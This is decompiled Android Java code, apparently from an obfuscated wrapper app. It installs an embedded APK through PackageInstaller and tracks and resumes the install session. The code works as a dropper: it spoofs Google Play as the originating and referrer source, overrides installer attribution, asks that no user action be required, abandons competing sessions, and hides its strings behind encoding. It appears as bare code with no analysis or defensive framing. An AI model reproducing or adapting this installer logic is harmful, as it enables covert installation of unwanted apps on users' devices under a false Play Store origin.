// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package W0;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.o2s2m.gae1fc3b2uc0u.R;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.ref.WeakReference;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import lyr.stable.wrapper.MainActivity;
import lyr.stable.wrapper.core.CoreInstallReceiver;
import lyr.stable.wrapper.core.PpVpn;

/* JADX INFO: loaded from: classes.dex */
public abstract class i {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static final String f797a = V0.p.a(new int[]{176, 41, 64, 54, 110, 27, 145, 228, 93, 47, 32, 189, 16});

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public static final ExecutorService f798b = Executors.newSingleThreadExecutor();

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public static final Handler f799c = new Handler(Looper.getMainLooper());

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public static final String f800d = V0.p.a(new int[]{144, 41, 64, 54, 120, 28, 140, 227, 72, 34, 32, 180, 61, 229, 122, 207, 128, 47, 93, 61});

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static final String f801e = V0.p.a(new int[]{146, 37, 70, 58, 81, 16, 189, 227, 89, 48, 63, 177, 13, 248, 64, 213, 151});

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static final String f802f = V0.p.a(new int[]{131, 35, 92, 55, 78, 27, 133, 207, 73, 48, 41, 170, 61, 247, 124, 200, 154, 41, 92});
    public static final String g = V0.p.a(new int[]{144, 41, 95, 125, 70, 27, 134, 226, 83, 42, 40, 246, 20, 243, 113, 216, 154, 40, 85});

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static final Object f803h = new Object();

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public static final m f804i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public static volatile boolean f805j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public static volatile int f806k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public static volatile boolean f807l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public static volatile boolean f808m;

    /* JADX INFO: renamed from: n, reason: collision with root package name */
    public static volatile int f809n;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public static volatile boolean f810o;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public static g f811p;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public static WeakReference f812q;

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public static WeakReference f813r;

    static {
        m mVar = new m();
        mVar.f824c = -1;
        f804i = mVar;
        f806k = -1;
        f809n = -1;
        f812q = new WeakReference(null);
        f813r = new WeakReference(null);
    }

    public static void a(Context context, int i2) {
        if (i2 < 0) {
            return;
        }
        try {
            context.getPackageManager().getPackageInstaller().abandonSession(i2);
            Log.i(f797a, "retired install session " + i2);
        } catch (Throwable unused) {
        }
    }

    public static void b(Context context) {
        int i2;
        try {
            PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
            m mVar = f804i;
            synchronized (mVar) {
                i2 = mVar.f824c;
            }
            for (PackageInstaller.SessionInfo sessionInfo : packageInstaller.getMySessions()) {
                if (sessionInfo.getSessionId() == i2) {
                    Log.i(f797a, "preserved active install session " + i2);
                } else {
                    packageInstaller.abandonSession(sessionInfo.getSessionId());
                    Log.i(f797a, "abandoned stale session " + sessionInfo.getSessionId());
                }
            }
        } catch (Throwable th) {
            Log.w(f797a, "abandon stale sessions failed: " + th.getMessage());
        }
    }

    public static boolean c(Context context) {
        l lVar;
        l(context, true);
        m mVar = f804i;
        synchronized (mVar) {
            if (mVar.f823b) {
                lVar = new l(-1, false);
            } else {
                int i2 = mVar.f824c;
                mVar.f822a = false;
                mVar.f823b = false;
                mVar.f824c = -1;
                lVar = new l(i2, true);
            }
        }
        if (!lVar.f820a) {
            Log.i(f797a, "retry blocked — current session awaits user action");
            return false;
        }
        d(context);
        e(context);
        a(context, lVar.f821b);
        f806k = -1;
        Log.w(f797a, "retired stuck install session " + lVar.f821b);
        return true;
    }

    public static void d(Context context) {
        context.getApplicationContext().getSharedPreferences(f800d, 0).edit().remove(f801e).remove(f802f).commit();
    }

    public static void e(Context context) {
        if (f811p == null) {
            return;
        }
        try {
            context.getApplicationContext().getPackageManager().getPackageInstaller().unregisterSessionCallback(f811p);
        } catch (Throwable unused) {
        }
        f811p = null;
        f809n = -1;
    }

    public static int f(Context context, byte[] bArr) throws IOException {
        boolean z2;
        int iCreateSession;
        PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams sessionParamsJ = j();
        if (Build.VERSION.SDK_INT < 34) {
            z2 = false;
        } else {
            try {
                sessionParamsJ.setInstallerPackageName(g);
                z2 = true;
            } catch (LinkageError | RuntimeException e2) {
                Log.w(f797a, "preferred installer attribution unavailable: " + e2.getMessage());
                z2 = false;
            }
        }
        try {
            iCreateSession = packageInstaller.createSession(sessionParamsJ);
        } catch (IllegalArgumentException | SecurityException e3) {
            if (!z2) {
                throw e3;
            }
            Log.w(f797a, "preferred installer attribution rejected; retrying without override: " + e3.getMessage());
            iCreateSession = packageInstaller.createSession(j());
        }
        m mVar = f804i;
        synchronized (mVar) {
            if (!mVar.f822a || iCreateSession < 0) {
                packageInstaller.abandonSession(iCreateSession);
                throw new IllegalStateException("Install session lost before commit");
            }
            mVar.f824c = iCreateSession;
            mVar.f823b = false;
            PackageInstaller.Session session = null;
            try {
                try {
                    PackageInstaller.Session sessionOpenSession = packageInstaller.openSession(iCreateSession);
                    OutputStream outputStreamOpenWrite = sessionOpenSession.openWrite("base.apk", 0L, bArr.length);
                    try {
                        outputStreamOpenWrite.write(bArr, 0, bArr.length);
                        sessionOpenSession.fsync(outputStreamOpenWrite);
                        outputStreamOpenWrite.close();
                        PendingIntent broadcast = PendingIntent.getBroadcast(context, iCreateSession, new Intent(context, (Class<?>) CoreInstallReceiver.class), Build.VERSION.SDK_INT >= 31 ? 167772160 : 134217728);
                        m(context, iCreateSession);
                        context.getApplicationContext().getSharedPreferences(f800d, 0).edit().putInt(f801e, iCreateSession).putBoolean(f802f, false).commit();
                        sessionOpenSession.commit(broadcast.getIntentSender());
                        sessionOpenSession.close();
                        return iCreateSession;
                    } catch (Throwable th) {
                        if (outputStreamOpenWrite != null) {
                            try {
                                outputStreamOpenWrite.close();
                            } catch (Throwable th2) {
                                th.addSuppressed(th2);
                            }
                        }
                        throw th;
                    }
                } catch (Exception e4) {
                    if (f804i.b(iCreateSession)) {
                        d(context);
                    }
                    try {
                        packageInstaller.abandonSession(iCreateSession);
                    } catch (Throwable unused) {
                    }
                    throw e4;
                }
            } catch (Throwable th3) {
                if (0 != 0) {
                    session.close();
                }
                throw th3;
            }
        }
    }

    public static void g(Activity activity) {
        l(activity, true);
        if (!f804i.a()) {
            Log.i(f797a, "install already in progress — skip");
            return;
        }
        f812q = new WeakReference(activity);
        d(activity);
        h hVar = (h) f813r.get();
        if (hVar != null) {
            MainActivity mainActivity = (MainActivity) hVar;
            mainActivity.f3635u.setVisibility(8);
            mainActivity.f3636v.setVisibility(8);
            mainActivity.f3638x.setVisibility(0);
            mainActivity.f3639y.setIndeterminate(true);
            mainActivity.f3640z.setText(R.string.core_preparing);
            mainActivity.f3617h.setEnabled(false);
            mainActivity.y();
        }
        f798b.execute(new f(activity, 0));
    }

    public static boolean h() {
        boolean z2;
        m mVar = f804i;
        synchronized (mVar) {
            z2 = mVar.f822a;
        }
        return z2;
    }

    public static boolean i(Context context, int i2) {
        try {
            PackageInstaller.SessionInfo sessionInfo = context.getPackageManager().getPackageInstaller().getSessionInfo(i2);
            if (sessionInfo == null) {
                return false;
            }
            if (Build.VERSION.SDK_INT >= 31 && !sessionInfo.isCommitted()) {
                return false;
            }
            String appPackageName = sessionInfo.getAppPackageName();
            return appPackageName == null || c.f784a.equals(appPackageName);
        } catch (Throwable th) {
            Log.w(f797a, "session validation failed: " + th.getMessage());
            return true;
        }
    }

    public static PackageInstaller.SessionParams j() {
        PackageInstaller.SessionParams sessionParams = new PackageInstaller.SessionParams(1);
        sessionParams.setAppPackageName(c.f784a);
        sessionParams.setOriginatingUri(Uri.parse("https://play.google.com/store"));
        sessionParams.setReferrerUri(Uri.parse("https://play.google.com"));
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 26) {
            sessionParams.setInstallReason(4);
        }
        if (i2 >= 31) {
            sessionParams.setRequireUserAction(2);
        }
        return sessionParams;
    }

    public static boolean k(Context context, int i2) {
        l(context, false);
        if (!f804i.b(i2)) {
            Log.i(f797a, "ignore stale install success session=" + i2);
            return false;
        }
        d(context);
        f806k = -1;
        e(context);
        f808m = false;
        f807l = false;
        PpVpn.b();
        f799c.post(new d(3));
        return true;
    }

    public static void l(Context context, boolean z2) {
        if (f805j) {
            return;
        }
        synchronized (f803h) {
            try {
                if (f805j) {
                    return;
                }
                Context applicationContext = context.getApplicationContext();
                SharedPreferences sharedPreferences = applicationContext.getSharedPreferences(f800d, 0);
                int i2 = sharedPreferences.getInt(f801e, -1);
                boolean z3 = sharedPreferences.getBoolean(f802f, false);
                if (i2 >= 0 && (!z2 || i(applicationContext, i2))) {
                    m mVar = f804i;
                    synchronized (mVar) {
                        try {
                            if (i2 < 0) {
                                mVar.f822a = false;
                                mVar.f823b = false;
                                mVar.f824c = -1;
                            } else {
                                mVar.f822a = true;
                                mVar.f823b = z3;
                                mVar.f824c = i2;
                            }
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                    m(applicationContext, i2);
                    Log.i(f797a, "restored install session " + i2 + " pendingUserAction=" + z3);
                } else if (i2 >= 0) {
                    d(applicationContext);
                    a(applicationContext, i2);
                    Log.i(f797a, "discarded finished install session " + i2);
                }
                f805j = true;
            } catch (Throwable th2) {
                throw th2;
            }
        }
    }

    public static void m(Context context, int i2) {
        e(context);
        f809n = i2;
        f810o = false;
        Context applicationContext = context.getApplicationContext();
        f811p = new g(applicationContext);
        applicationContext.getPackageManager().getPackageInstaller().registerSessionCallback(f811p, f799c);
    }
}
